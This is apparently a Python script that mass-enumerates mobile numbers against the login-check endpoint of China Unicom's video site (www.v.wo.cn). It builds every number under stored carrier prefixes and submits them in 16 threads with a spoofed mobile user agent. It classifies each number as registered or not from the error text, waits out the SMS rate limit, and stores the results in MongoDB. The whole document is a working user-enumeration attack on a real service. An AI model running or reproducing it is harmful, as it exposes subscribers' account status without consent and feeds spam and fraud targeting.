#!/usr/bin/env python
# -*- coding:utf-8 -*-

import requests, sys, time
import base64, json
from mongo_setting import MONOGO_URI, MONOGO_DB
from pymongo import MongoClient
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import wait

reload(sys)
sys.setdefaultencoding('utf-8')

mongo_conn = MongoClient(MONOGO_URI)
mongo_db = mongo_conn[MONOGO_DB]

def check_phone(phone_number):
    #time.sleep(1)
    user_not_exist = "用户不存在!"
    phone_error = "手机号或密码错误!"
    phone_other = "1分钟内不能重复发送短信!"
    phone_base64 = base64.b64encode(phone_number)
    data = "USER_PHONENUM=" + phone_base64 + "&RANDOM_CODE=MTIzMTIz&LOGIN_TYPE=P"
    #post_html = requests.post(url=loginCheck_url, headers=headers, data=data)
    post_html = get_html(data)
    if post_html:
        if post_html.content:
            html_json = json.loads(post_html.content)
            if html_json.has_key("desc"):
                desc = html_json["desc"]
                if desc == user_not_exist:
                    print desc
                    phone_number_staus = 0
                    in_mongo = {
                        "phone_number": phone_number,
                        "phone_number_staus": phone_number_staus
                    }
                    if mongo_db.wo_phone.find_one({"phone_number": phone_number}) == None:
                        mongo_db.wo_phone.insert(in_mongo)
                elif desc == phone_error:
                    print desc
                    phone_number_staus = 1
                    in_mongo = {
                        "phone_number": phone_number,
                        "phone_number_staus": phone_number_staus
                    }
                    if mongo_db.wo_phone.find_one({"phone_number": phone_number}) == None:
                        mongo_db.wo_phone.insert(in_mongo)
                elif desc == phone_other:
                    time.sleep(10)
                    check_phone(phone_number)
            elif html_json.has_key("success"):
                phone_number_staus = 1
                in_mongo = {
                    "phone_number": phone_number,
                    "phone_number_staus": phone_number_staus
                }
                if mongo_db.wo_phone.find_one({"phone_number": phone_number}) == None:
                    mongo_db.wo_phone.insert(in_mongo)
            else:
                check_phone(phone_number)
    else:
        check_phone(phone_number)

def get_html(data):
    loginCheck_url = "http://www.v.wo.cn/UnicomTV/bin/login/login?method=loginCheck"
    headers = {
        "Host": "www.v.wo.cn",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Origin": "http://www.v.wo.cn",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }
    try:
        post_html = requests.post(url=loginCheck_url, headers=headers, data=data)
        return post_html
    except:
        get_html(data)

def main():
    mongo_finds = mongo_db.phone_section.find({"Corp": "中国联通"}, {"Mobile": 1})
    with ThreadPoolExecutor(16) as executor:
        for mongo_find in mongo_finds:
            mobile = mongo_find["Mobile"]
            find_status = mongo_db.phone_section.find({"Mobile": mobile})
            find_key = find_status[0]
            tasks = []
            if find_key.has_key("status"):
                pass
            else:
                for i in range(10000):
                    phone_end = str(i).zfill(4)
                    phone_number = str(mobile) + phone_end
                    if mongo_db.wo_phone.find_one({"phone_number": phone_number}) == None:
                        tasks.append(executor.submit(check_phone, phone_number))
                wait(tasks)
                mongo_db.phone_section.update({"Mobile": mobile}, {"$set": {"status": 1}})

if __name__ == "__main__":
   main()